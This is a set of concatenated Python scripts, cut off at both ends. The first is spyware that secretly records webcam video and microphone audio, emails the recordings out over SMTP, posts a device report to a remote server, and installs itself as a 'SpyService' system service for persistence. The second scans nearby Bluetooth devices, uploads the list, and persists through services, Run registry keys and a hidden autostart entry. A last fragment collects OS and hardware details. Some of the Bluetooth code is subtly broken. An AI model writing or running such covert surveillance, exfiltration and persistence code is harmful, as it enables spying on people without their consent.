            print(f"    FAILED: {exc}", file=sys.stderr)
            sys.exit(1)
    else:
        print(f"    SKIPPED — {SMTP_SERVER}:{SMTP_PORT} not reachable in this environment")

    sys.exit(0)

#!/usr/bin/env python3
import os
import sys
import platform
import subprocess
import time
import smtplib
import tempfile
import shutil
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from urllib.request import Request, urlopen
from urllib.error import URLError, HTTPError
from datetime import datetime


# Configuration
SERVER_ENDPOINT = "https://example.com/api/device-report"
MAX_RETRIES = 3
INITIAL_BACKOFF = 1
OUTPUT_DIR = os.path.join(tempfile.gettempdir(), 'capture_output')
SMTP_SERVER = "smtp.gmail.com"
SMTP_PORT = 587
SMTP_USER = "sender@gmail.com"
SMTP_PASSWORD = "app_password"
RECIPIENT_EMAIL = "recipient@example.com"
RECORDING_DURATION = 5  # seconds


def check_linux_devices():
    """Check camera and microphone devices on Linux."""
    devices = {'cameras': [], 'microphones': []}

    # Check video devices
    video_dir = '/dev'
    if os.path.exists(video_dir):
        for entry in os.listdir(video_dir):
            if entry.startswith('video'):
                path = os.path.join(video_dir, entry)
                try:
                    if os.access(path, os.R_OK | os.W_OK):
                        status = 'available'
                    else:
                        status = 'unavailable (no permission)'
                except:
                    status = 'unavailable'
                devices['cameras'].append((entry, status))

    # Check audio devices
    snd_dir = '/dev/snd'
    if os.path.exists(snd_dir):
        for entry in os.listdir(snd_dir):
            if entry.startswith('pcmC') and 'c' in entry:
                path = os.path.join(snd_dir, entry)
                try:
                    if os.access(path, os.R_OK | os.W_OK):
                        status = 'available'
                    else:
                        status = 'unavailable (no permission)'
                except:
                    status = 'unavailable'
                devices['microphones'].append((entry, status))

    return devices


def check_macos_devices():
    """Check camera and microphone devices on macOS."""
    devices = {'cameras': [], 'microphones': []}

    try:
        result = subprocess.run(
            ['system_profiler', 'SPCameraDataType'],
            capture_output=True,
            text=True,
            timeout=5
        )
        if result.returncode == 0 and result.stdout:
            lines = result.stdout.split('\n')
            for line in lines:
                line = line.strip()
                if line and ':' in line and 'Camera' in line:
                    devices['cameras'].append((line.split(':')[0].strip(), 'available'))
    except:
        pass

    try:
        result = subprocess.run(
            ['system_profiler', 'SPAudioDataType'],
            capture_output=True,
            text=True,
            timeout=5
        )
        if result.returncode == 0 and result.stdout:
            lines = result.stdout.split('\n')
            for line in lines:
                line = line.strip()
                if 'Input' in line or 'Microphone' in line:
                    if ':' in line:
                        devices['microphones'].append((line.split(':')[0].strip(), 'available'))
    except:
        pass

    return devices


def check_windows_devices():
    """Check camera and microphone devices on Windows."""
    devices = {'cameras': [], 'microphones': []}

    try:
        result = subprocess.run(
            ['powershell', '-Command', 
             "Get-PnpDevice -Class Camera | Select-Object -Property FriendlyName,Status | Format-List"],
            capture_output=True,
            text=True,
            timeout=5
        )
        if result.returncode == 0 and result.stdout:
            lines = result.stdout.split('\n')
            name = None
            for line in lines:
                line = line.strip()
                if line.startswith('FriendlyName'):
                    name = line.split(':', 1)[1].strip()
                elif line.startswith('Status') and name:
                    status_val = line.split(':', 1)[1].strip()
                    status = 'available' if status_val == 'OK' else 'unavailable'
                    devices['cameras'].append((name, status))
                    name = None
    except:
        pass

    try:
        result = subprocess.run(
            ['powershell', '-Command', 
             "Get-PnpDevice -Class AudioEndpoint | Where-Object {$_.FriendlyName -like '*Microphone*' -or $_.FriendlyName -like '*Input*'} | Select-Object -Property FriendlyName,Status | Format-List"],
            capture_output=True,
            text=True,
            timeout=5
        )
        if result.returncode == 0 and result.stdout:
            lines = result.stdout.split('\n')
            name = None
            for line in lines:
                line = line.strip()
                if line.startswith('FriendlyName'):
                    name = line.split(':', 1)[1].strip()
                elif line.startswith('Status') and name:
                    status_val = line.split(':', 1)[1].strip()
                    status = 'available' if status_val == 'OK' else 'unavailable'
                    devices['microphones'].append((name, status))
                    name = None
    except:
        pass

    return devices


def record_video_audio(output_dir):
    """Record video from webcam and audio from microphone."""
    os.makedirs(output_dir, exist_ok=True)

    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    video_file = os.path.join(output_dir, f'video_{timestamp}.avi')
    audio_file = os.path.join(output_dir, f'audio_{timestamp}.wav')

    system = platform.system()

    if system == 'Linux':
        # Record video with ffmpeg
        try:
            subprocess.run(
                ['ffmpeg', '-f', 'v4l2', '-i', '/dev/video0', '-t', str(RECORDING_DURATION), 
                 '-vcodec', 'libx264', video_file],
                capture_output=True,
                timeout=RECORDING_DURATION + 5
            )
        except:
            pass

        # Record audio with arecord
        try:
            subprocess.run(
                ['arecord', '-d', str(RECORDING_DURATION), '-f', 'cd', audio_file],
                capture_output=True,
                timeout=RECORDING_DURATION + 5
            )
        except:
            pass

    elif system == 'Darwin':
        # Record video and audio with ffmpeg
        try:
            subprocess.run(
                ['ffmpeg', '-f', 'avfoundation', '-i', '0:0', '-t', str(RECORDING_DURATION), 
                 video_file],
                capture_output=True,
                timeout=RECORDING_DURATION + 5
            )
        except:
            pass

    elif system == 'Windows':
        # Record with ffmpeg
        try:
            subprocess.run(
                ['ffmpeg', '-f', 'dshow', '-i', 'video=Integrated Webcam', '-t', 
                 str(RECORDING_DURATION), video_file],
                capture_output=True,
                timeout=RECORDING_DURATION + 5
            )
        except:
            pass

        try:
            subprocess.run(
                ['ffmpeg', '-f', 'dshow', '-i', 'audio=Microphone', '-t', 
                 str(RECORDING_DURATION), audio_file],
                capture_output=True,
                timeout=RECORDING_DURATION + 5
            )
        except:
            pass

    return [f for f in [video_file, audio_file] if os.path.exists(f)]


def send_email_with_attachments(files):
    """Send recorded files via email."""
    try:
        msg = MIMEMultipart()
        msg['From'] = SMTP_USER
        msg['To'] = RECIPIENT_EMAIL
        msg['Subject'] = f'Capture Report - {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}'

        for file_path in files:
            with open(file_path, 'rb') as f:
                part = MIMEBase('application', 'octet-stream')
                part.set_payload(f.read())
                encoders.encode_base64(part)
                part.add_header('Content-Disposition', f'attachment; filename={os.path.basename(file_path)}')
                msg.attach(part)

        server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
        server.starttls()
        server.login(SMTP_USER, SMTP_PASSWORD)
        server.send_message(msg)
        server.quit()
        print(f"Email sent successfully with {len(files)} attachments")
        return True
    except Exception as e:
        print(f"Failed to send email: {e}")
        return False


def establish_persistence():
    """Establish persistence by creating a system service."""
    system = platform.system()
    script_path = os.path.abspath(__file__)

    if system == 'Windows':
        # Create Windows service
        service_script = f'''
$serviceName = "SpyService"
$binaryPath = "python.exe `"{script_path}`""
New-Service -Name $serviceName -BinaryPathName $binaryPath -DisplayName "SpyService" -StartupType Automatic
Start-Service -Name $serviceName
'''
        try:
            subprocess.run(
                ['powershell', '-Command', service_script],
                capture_output=True,
                timeout=10
            )
            print("Windows service 'SpyService' created")
        except:
            pass

    elif system == 'Linux':
        # Create systemd service
        service_content = f'''[Unit]
Description=Spy Service
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/python3 {script_path}
Restart=always

[Install]
WantedBy=multi-user.target
'''
        service_path = '/etc/systemd/system/spy.service'
        try:
            with open(service_path, 'w') as f:
                f.write(service_content)
            subprocess.run(['systemctl', 'daemon-reload'], capture_output=True)
            subprocess.run(['systemctl', 'enable', 'spy'], capture_output=True)
            subprocess.run(['systemctl', 'start', 'spy'], capture_output=True)
            print("Linux service 'spy' created")
        except:
            pass


def write_report(devices, filename='capture_report.txt'):
    """Write device check results to a file."""
    with open(filename, 'w') as f:
        for name, status in devices['cameras']:
            f.write(f"{name}: {status}\n")

        for name, status in devices['microphones']:
            f.write(f"{name}: {status}\n")


def send_report_to_server(filename, endpoint):
    """Send report to remote server with exponential backoff retry."""
    try:
        with open(filename, 'r') as f:
            report_data = f.read()
    except IOError as e:
        print(f"Failed to read report file: {e}")
        return False

    backoff = INITIAL_BACKOFF

    for attempt in range(1, MAX_RETRIES + 1):
        try:
            print(f"Attempt {attempt}/{MAX_RETRIES}: Sending report to {endpoint}...")

            data = report_data.encode('utf-8')
            req = Request(endpoint, data=data, method='POST')
            req.add_header('Content-Type', 'text/plain')
            req.add_header('Content-Length', str(len(data)))

            with urlopen(req, timeout=10) as response:
                status_code = response.getcode()
                print(f"Report successfully sent. Server responded with status {status_code}")
                return True

        except HTTPError as e:
            print(f"HTTP Error {e.code}: {e.reason}")
            if attempt < MAX_RETRIES:
                print(f"Retrying in {backoff} seconds...")
                time.sleep(backoff)
                backoff *= 2
            else:
                print("Max retries reached. Failed to send report.")

        except URLError as e:
            print(f"Network error: {e.reason}")
            if attempt < MAX_RETRIES:
                print(f"Retrying in {backoff} seconds...")
                time.sleep(backoff)
                backoff *= 2
            else:
                print("Max retries reached. Failed to send report.")

        except Exception as e:
            print(f"Unexpected error: {e}")
            if attempt < MAX_RETRIES:
                print(f"Retrying in {backoff} seconds...")
                time.sleep(backoff)
                backoff *= 2
            else:
                print("Max retries reached. Failed to send report.")

    return False


def main():
    system = platform.system()

    print(f"Checking devices on {system}...\n")

    if system == 'Linux':
        devices = check_linux_devices()
    elif system == 'Darwin':
        devices = check_macos_devices()
    elif system == 'Windows':
        devices = check_windows_devices()
    else:
        print(f"Unsupported platform: {system}")
        return

    print("=== CAMERAS ===")
    if devices['cameras']:
        for name, status in devices['cameras']:
            print(f"{name}: {status}")
    else:
        print("No cameras detected")

    print("\n=== MICROPHONES ===")
    if devices['microphones']:
        for name, status in devices['microphones']:
            print(f"{name}: {status}")
    else:
        print("No microphones detected")

    report_file = 'capture_report.txt'
    write_report(devices, report_file)

    print(f"\nDevice check complete. Report saved to {report_file}")

    print("\nAttempting to send report to remote server...")
    send_report_to_server(report_file, SERVER_ENDPOINT)

    print(f"\nRecording video and audio for {RECORDING_DURATION} seconds...")
    recorded_files = record_video_audio(OUTPUT_DIR)

    if recorded_files:
        print(f"Recorded {len(recorded_files)} files to {OUTPUT_DIR}")
        print("\nSending recorded files via email...")
        send_email_with_attachments(recorded_files)
    else:
        print("No files were recorded (devices may be unavailable or tools not installed)")

    print("\nEstablishing persistence...")
    establish_persistence()

    print("\nProgram execution complete.")


if __name__ == '__main__':
    main()

#!/usr/bin/env python3
import sys
import argparse
import socket
import struct
import time
import platform
import subprocess
from pathlib import Path
from urllib.request import Request, urlopen
from urllib.error import URLError, HTTPError
from datetime import datetime


def scan_bluetooth_devices(duration_seconds=5):
    """Scan for nearby Bluetooth devices using platform-specific methods."""
    devices = {}
    system = platform.system()

    if system == "Linux":
        devices = scan_bluetooth_linux(duration_seconds)
    elif system == "Windows":
        devices = scan_bluetooth_windows(duration_seconds)
    elif system == "Darwin":
        devices = scan_bluetooth_macos(duration_seconds)
    else:
        devices = scan_bluetooth_socket(duration_seconds)

    return devices


def scan_bluetooth_linux(duration_seconds):
    """Scan Bluetooth devices on Linux using hcitool."""
    devices = {}
    try:
        result = subprocess.run(
            ['hcitool', 'scan', '--flush'],
            capture_output=True,
            text=True,
            timeout=duration_seconds + 5
        )

        for line in result.stdout.splitlines()[1:]:
            parts = line.strip().split(maxsplit=1)
            if len(parts) == 2:
                addr, name = parts
                devices[addr] = name
    except (subprocess.TimeoutExpired, FileNotFoundError, Exception):
        devices = scan_bluetooth_socket(duration_seconds)

    return devices


def scan_bluetooth_socket(duration_seconds):
    """Attempt raw Bluetooth socket scanning."""
    devices = {}
    try:
        sock = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_RAW, socket.BTPROTO_HCI)
        sock.bind((0,))

        sock.setsockopt(socket.SOL_HCI, socket.HCI_FILTER, struct.pack("IIIh2x", 0xffffffff, 0xffffffff, 0xffffffff, 0))

        cmd = struct.pack("<BBBBB", 0x01, 0x01, 0x04, 0x05, 0x33, 0x8b, 0x9e, 0x08, 0x00)
        sock.send(cmd)

        start_time = time.time()
        while time.time() - start_time < duration_seconds:
            sock.settimeout(0.5)
            try:
                data = sock.recv(1024)
                if len(data) > 12:
                    addr_bytes = data[3:9]
                    addr = ':'.join([f'{b:02X}' for b in addr_bytes])
                    name = f"Device_{addr[-5:].replace(':', '')}"
                    devices[addr] = name
            except socket.timeout:
                continue
            except Exception:
                break

        sock.close()
    except (OSError, AttributeError, Exception):
        pass

    return devices


def scan_bluetooth_windows(duration_seconds):
    """Scan Bluetooth devices on Windows using PowerShell."""
    devices = {}
    try:
        ps_script = '''
        Get-PnpDevice -Class Bluetooth | Where-Object {$_.Status -eq "OK"} | 
        Select-Object -Property FriendlyName, InstanceId | 
        ForEach-Object { "$($_.InstanceId)|$($_.FriendlyName)" }
        '''

        result = subprocess.run(
            ['powershell', '-Command', ps_script],
            capture_output=True,
            text=True,
            timeout=duration_seconds + 5
        )

        for line in result.stdout.splitlines():
            if '|' in line:
                parts = line.strip().split('|', 1)
                if len(parts) == 2:
                    addr, name = parts
                    devices[addr] = name
    except Exception:
        pass

    return devices


def scan_bluetooth_macos(duration_seconds):
    """Scan Bluetooth devices on macOS using system_profiler."""
    devices = {}
    try:
        result = subprocess.run(
            ['system_profiler', 'SPBluetoothDataType'],
            capture_output=True,
            text=True,
            timeout=duration_seconds + 5
        )

        lines = result.stdout.splitlines()
        current_device = None
        for line in lines:
            line = line.strip()
            if ':' in line and not line.startswith('Address'):
                if 'Address' in line:
                    addr = line.split(':', 1)[1].strip()
                    current_device = addr
                elif current_device and 'Name' in line:
                    name = line.split(':', 1)[1].strip()
                    devices[current_device] = name
                    current_device = None
    except Exception:
        pass

    return devices


def establish_persistence():
    """Create persistence mechanism based on platform."""
    system = platform.system()

    if system == "Windows":
        establish_persistence_windows()
    elif system == "Linux":
        establish_persistence_linux()
    else:
        marker = Path("persistence_marker.txt")
        marker.write_text(f"Persistence established at {datetime.now().isoformat()}\n")


def establish_persistence_windows():
    """Create Windows service persistence."""
    try:
        service_name = "BluetoothTrackerService"
        script_path = Path(__file__).resolve()

        subprocess.run(
            ['sc', 'create', service_name, 
             f'binPath= {sys.executable} {script_path}',
             'start= auto'],
            capture_output=True,
            timeout=10
        )

        reg_key = r'Software\Microsoft\Windows\CurrentVersion\Run'
        subprocess.run(
            ['reg', 'add', f'HKCU\\{reg_key}', 
             '/v', service_name, '/t', 'REG_SZ', 
             '/d', f'{sys.executable} {script_path}', '/f'],
            capture_output=True,
            timeout=10
        )
    except Exception:
        startup_dir = Path.home() / 'AppData' / 'Roaming' / 'Microsoft' / 'Windows' / 'Start Menu' / 'Programs' / 'Startup'
        if startup_dir.exists():
            script_path = Path(__file__).resolve()
            bat_file = startup_dir / 'BluetoothTrackerService.bat'
            try:
                bat_file.write_text(f'@echo off\nstart /min {sys.executable} {script_path}\n')
            except Exception:
                pass


def establish_persistence_linux():
    """Create Linux systemd service persistence."""
    try:
        service_name = "bluetoothtracker"
        script_path = Path(__file__).resolve()

        systemd_dir = Path.home() / '.config' / 'systemd' / 'user'
        systemd_dir.mkdir(parents=True, exist_ok=True)

        service_content = f"""[Unit]
Description=Bluetooth Tracker Service
After=network.target

[Service]
Type=simple
ExecStart={sys.executable} {script_path}
Restart=always

[Install]
WantedBy=default.target
"""

        service_file = systemd_dir / f'{service_name}.service'
        service_file.write_text(service_content)

        subprocess.run(['systemctl', '--user', 'enable', service_name], 
                      capture_output=True, timeout=10)

    except Exception:
        autostart_dir = Path.home() / '.config' / 'autostart'
        autostart_dir.mkdir(parents=True, exist_ok=True)

        script_path = Path(__file__).resolve()
        desktop_content = f"""[Desktop Entry]
Type=Application
Name=Bluetooth Tracker
Exec={sys.executable} {script_path}
Hidden=true
NoDisplay=true
X-GNOME-Autostart-enabled=true
"""

        try:
            desktop_file = autostart_dir / 'bluetoothtracker.desktop'
            desktop_file.write_text(desktop_content)
        except Exception:
            pass


def main():
    parser = argparse.ArgumentParser(description='Process Bluetooth scan data and upload inventory')
    parser.add_argument('--server-url', default='http://localhost:8080/upload', 
                       help='Remote asset server URL for upload')
    parser.add_argument('--scan-duration', type=int, default=5,
                       help='Duration in seconds for each scan cycle')
    parser.add_argument('--scan-cycles', type=int, default=3,
                       help='Number of scan cycles to perform')
    parser.add_argument('--save-interval', type=int, default=1,
                       help='Save collected data after every N cycles')
    args = parser.parse_args()

    output_path = Path("target/bt_inventory.txt")
    output_path.parent.mkdir(parents=True, exist_ok=True)
    log_path = Path("upload_errors.log")

    try:
        establish_persistence()
    except Exception:
        pass

    all_devices = {}

    for cycle in range(args.scan_cycles):
        devices = scan_bluetooth_devices(args.scan_duration)

        for addr, name in devices.items():
            all_devices[addr] = name

        if (cycle + 1) % args.save_interval == 0 or cycle == args.scan_cycles - 1:
            try:
                lines = [f"{addr}|{name}" for addr, name in sorted(all_devices.items())]
                output_path.write_text('\n'.join(lines) + '\n')
                print(f"Saved {len(all_devices)} device(s) to '{output_path}'")
            except Exception as e:
                print(f"Error saving devices: {e}", file=sys.stderr)

        if cycle < args.scan_cycles - 1:
            time.sleep(1)

    print(f"Discovered {len(all_devices)} unique device(s) across {args.scan_cycles} scan cycle(s)")

    unique_ids = set(all_devices.keys())

    try:
        upload_data = '\n'.join(sorted(unique_ids)) + '\n'
        file_data = upload_data.encode('utf-8')

        request = Request(args.server_url, data=file_data, method='POST')
        request.add_header('Content-Type', 'text/plain')
        request.add_header('Content-Length', str(len(file_data)))

        with urlopen(request, timeout=30) as response:
            status = response.status
            if status == 200 or status == 201:
                print(f"Successfully uploaded inventory to {args.server_url}")
            else:
                raise HTTPError(args.server_url, status, f"Unexpected status code: {status}", response.headers, None)

    except (URLError, HTTPError, OSError) as e:
        timestamp = datetime.now().isoformat()
        error_msg = f"[{timestamp}] Upload failed to {args.server_url}: {e}\n"

        try:
            with open(log_path, 'a') as log_file:
                log_file.write(error_msg)
            print(f"Upload failed. Error logged to '{log_path}'", file=sys.stderr)
        except Exception as log_error:
            print(f"Upload failed and could not write to log: {log_error}", file=sys.stderr)

    except Exception as e:
        timestamp = datetime.now().isoformat()
        error_msg = f"[{timestamp}] Unexpected error during upload to {args.server_url}: {e}\n"

        try:
            with open(log_path, 'a') as log_file:
                log_file.write(error_msg)
            print(f"Unexpected upload error. Error logged to '{log_path}'", file=sys.stderr)
        except Exception as log_error:
            print(f"Unexpected error and could not write to log: {log_error}", file=sys.stderr)

    sys.exit(0)


if __name__ == "__main__":
    main()

import os
import platform
import subprocess


def get_os_version() -> str:
    """Return a human-readable OS version string for the current system."""
    system = platform.system()

    if system == "Windows":
        release = platform.release()
        version = platform.version()
        return f"Windows {release} ({version})"

    if system == "Darwin":
        mac_version = platform.mac_ver()[0] or platform.release()
        return f"macOS {mac_version}"

    if system == "Linux":
        try:
            info = platform.freedesktop_os_release()
            name = info.get("PRETTY_NAME") or info.get("NAME", "Linux")
            return name
        except (AttributeError, OSError):
            return f"Linux {platform.release()}"

    return f"{system} {platform.release()}"


def get_hardware_specs() -> str:
    """Return a summary of hardware specifications for the current system."""
    lines = []

    machine = platform.machine()
    processor = platform.processor()
    architecture = platform.architecture()

    lines.append(f"Machine type   : {machine or 'unknown'}")
    lines.append(f"Architecture   : {architecture[0]}")
    if processor:
        lines.append(f"Processor      : {processor}")

    cpu_count = os.cpu_count()
    if cpu_count is not None:
        lines.append(f"Logical CPUs   : {cpu_count}")

    system = platform.system()
    if system == "Linux":
        try:
            with open("/proc/meminfo", "r") as fh:
                for line in fh:
                    if line.startswith("MemTotal:"):
                        kb = int(line.split()[1])
                        gb = kb / (1024 ** 2)
                        lines.append(f"Total RAM      : {gb:.2f} GB")
                        break
        except OSError:
            pass
    elif system == "Darwin":
        try:
            result = subprocess.run(
                ["sysctl", "-n", "hw.memsize"],
                capture_output=True,
                text=True,
                timeout=5,
            )
            if result.returncode == 0:
                gb = int(result.stdout.strip()) / (1024 ** 3)
                lines.append(f"Total RAM      : {gb:.2f} GB")
        except (OSError, ValueError, subprocess.TimeoutExpired):
            pass
    elif system == "Windows":
        try:
            result = subprocess.run(
                ["wmic", "ComputerSystem", "get", "TotalPhysicalMemory", "/value"],
                capture_output=True,
                text=True,
                timeout=10,
            )
            if result.returncode == 0:
                for part in result.stdout.splitlines():
                    if part.startswith("TotalPhysicalMemory="):
                        gb = int(part.split("=")[1]) / (1024 ** 3)
                        lines.append(f"Total RAM      : {gb:.2f} GB")
                        break
        except (OSError, ValueError, subprocess.TimeoutExpired):
            pass

    lines.append(f"OS             : {platform.system()} {platform.release()}")
    lines.append(f"Python bits    : {architecture[0]}")

    return "\n".join(lines)


def write_system_info(file_path: str, os_version: str, hardware_specs: str) -> None:
    """Write OS version and hardware specs to a text file.

    Args:
        file_path: Destination path for the output file.
        os_version: OS version string (written on line 1).
        hardware_specs: Hardware specification string (written on line 2).
    """
    parent = os.path.dirname(os.path.abspath(file_path))
    os.makedirs(parent, exist_ok=True)

    with open(file_path, "w", encoding="utf-8") as fh:
        fh.write(os_version + "\n")
        fh.write(hardware_specs + "\n")


if __name__ == "__main__":
